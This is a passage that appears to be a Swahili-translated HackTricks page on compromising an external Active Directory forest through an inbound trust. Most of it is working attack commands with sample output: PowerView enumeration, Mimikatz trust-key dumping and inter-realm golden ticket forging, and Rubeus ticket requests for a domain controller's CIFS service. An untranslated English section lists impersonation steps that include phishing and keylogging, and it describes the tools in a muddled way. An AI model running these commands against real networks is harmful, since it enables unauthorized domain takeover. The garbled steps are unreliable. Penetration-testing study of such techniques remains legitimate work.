# Kikoa cha Msitu wa Nje - Mwelekeo Mmoja (Kuingia) au wa pande mbili

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Katika hali hii, kikoa cha nje kinakuamini (au vyote viwili vinakuamini), hivyo unaweza kupata aina fulani ya ufikiaji juu yake.

## Uchunguzi

Kwanza kabisa, unahitaji **kuchunguza** **imani**:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
Katika uchunguzi uliopita iligundulika kuwa mtumiaji **`crossuser`** yuko ndani ya kikundi cha **`External Admins`** ambacho kina **upatikanaji wa Msimamizi** ndani ya **DC ya kikoa cha nje**.

## Upatikanaji wa Awali

Ikiwa hukupata upatikanaji wa **maalum** wa mtumiaji wako katika kikoa kingine, bado unaweza kurudi kwenye Methodolojia ya AD na jaribu **privesc kutoka kwa mtumiaji asiye na mamlaka** (vitu kama kerberoasting kwa mfano):

Unaweza kutumia **Powerview functions** kwa **uchambuzi** wa **kikoa kingine** kwa kutumia paramu ya `-Domain` kama ifuatavyo:
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Uwakilishi

### Kuingia

Kwa kutumia njia ya kawaida na sifa za watumiaji ambao wana ufikiaji wa kikoa cha nje, unapaswa kuweza kupata:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Matumizi Mabaya ya Historia ya SID

Unaweza pia kutumia [**Historia ya SID**](sid-history-injection.md) kwenye uaminifu wa misitu.

Ikiwa mtumiaji amehamishiwa **kutoka msitu mmoja hadi mwingine** na **Uchujaji wa SID haujaanzishwa**, inawezekana **kuongeza SID kutoka msitu mwingine**, na hii **SID** itaongezwa kwenye **kitufe cha mtumiaji** wakati wa kuthibitisha **katika uaminifu**.

{% hint style="warning" %}
Kama ukumbusho, unaweza kupata ufunguo wa kusaini na
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
```
{% endhint %}

Unaweza **saini na** ufunguo **unaouaminika** TGT ukiiga mtumiaji wa kikoa cha sasa.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Njia kamili ya kujifanya kuwa mtumiaji

To impersonate a user in an external forest domain, follow these steps:

1. Obtain the user's credentials: This can be done through various methods such as phishing, keylogging, or password cracking.

2. Establish a connection to the domain controller (DC) of the external forest domain: Use tools like `mimikatz` or `lsadump` to extract the NTLM hash or plaintext password of the user.

3. Pass the user's credentials to the DC: Use tools like `mimikatz` or `pth-winexe` to pass the obtained credentials to the DC.

4. Obtain a Kerberos ticket-granting ticket (TGT): Use tools like `mimikatz` or `kekeo` to request a TGT for the user from the DC.

5. Generate a Kerberos service ticket: Use tools like `mimikatz` or `kekeo` to generate a service ticket for the desired service using the obtained TGT.

6. Use the generated service ticket: Pass the service ticket to the desired service to gain access as the impersonated user.

By following these steps, you can fully impersonate a user in an external forest domain and gain unauthorized access to resources within that domain.
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
